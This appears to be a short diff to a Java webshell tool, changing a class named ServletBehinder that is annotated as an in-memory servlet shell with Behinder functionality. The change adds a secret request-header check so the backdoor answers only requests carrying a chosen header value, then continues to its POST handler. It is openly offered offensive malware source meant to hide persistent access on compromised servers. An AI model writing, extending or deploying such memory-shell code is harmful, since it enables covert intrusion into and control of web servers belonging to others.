@@ -17,9 +17,11 @@ import java.util.Map;
  */
 @MemShell(MemShell.Servlet)
 @MemShellFunction(MemShellFunction.Behinder)
-@JavaClassModifiable({JavaClassModifiable.pass})
+@JavaClassModifiable({JavaClassModifiable.pass, JavaClassModifiable.lockHeaderKey, JavaClassModifiable.lockHeaderValue})
 public class ServletBehinder implements InvocationHandler {
     private static String pass;
+    private String lockHeaderKey;
+    private String lockHeaderValue;
 
     public ServletBehinder() {
     }
@@ -34,6 +36,9 @@ public class ServletBehinder implements InvocationHandler {
 
     private void run(Object servletRequest, Object servletResponse) {
         try {
+            if(!((String)invokeMethod(servletRequest, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey})).contains(lockHeaderValue)) {
+                return;
+            }
             String method = (String) invokeMethod(servletRequest, "getMethod", new Class[]{}, new Object[]{});
             if (!method.equalsIgnoreCase("POST"))
                 return;
